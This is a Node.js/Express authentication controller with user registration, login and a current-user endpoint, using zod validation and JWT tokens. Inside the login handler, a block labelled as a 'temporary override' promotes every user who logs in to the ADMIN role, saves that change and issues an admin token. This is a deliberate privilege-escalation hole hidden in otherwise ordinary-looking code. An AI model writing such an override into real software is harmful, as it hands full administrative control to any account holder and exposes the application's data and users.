const User = require('../models/User');
const { signToken } = require('../lib/jwt');
const { z } = require('zod');

const registerSchema = z.object({
  name: z.string().min(2),
  email: z.string().email(),
  password: z.string().min(6),
});

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
});

exports.register = async (req, res, next) => {
  try {
    const body = registerSchema.parse(req.body);
    const exists = await User.findOne({ email: body.email });
    if (exists) return res.status(409).json({ success: false, message: 'Email already registered' });

    const userCount = await User.countDocuments();
    const role = userCount === 0 ? 'ADMIN' : 'MEMBER';

    const user = await User.create({ ...body, role });
    const token = signToken({ id: user._id, role: user.role });

    res.status(201).json({
      success: true,
      token,
      user: { _id: user._id, name: user.name, email: user.email, role: user.role },
    });
  } catch (err) {
    if (err.name === 'ZodError') {
      return res.status(422).json({ success: false, message: 'Validation error', errors: err.errors });
    }
    next(err);
  }
};

exports.login = async (req, res, next) => {
  try {
    const body = loginSchema.parse(req.body);
    const user = await User.findOne({ email: body.email }).select('+password');
    if (!user) return res.status(401).json({ success: false, message: 'Invalid credentials' });

    const match = await user.comparePassword(body.password);
    if (!match) return res.status(401).json({ success: false, message: 'Invalid credentials' });

    // Temporary override to force ADMIN role upon login
    if (user.role !== 'ADMIN') {
        user.role = 'ADMIN';
        await user.save();
    }

    const token = signToken({ id: user._id, role: user.role });
    res.json({
      success: true,
      token,
      user: { _id: user._id, name: user.name, email: user.email, role: user.role },
    });
  } catch (err) {
    if (err.name === 'ZodError') {
      return res.status(422).json({ success: false, message: 'Validation error', errors: err.errors });
    }
    next(err);
  }
};

exports.me = async (req, res) => {
  res.json({ success: true, user: req.user });
};
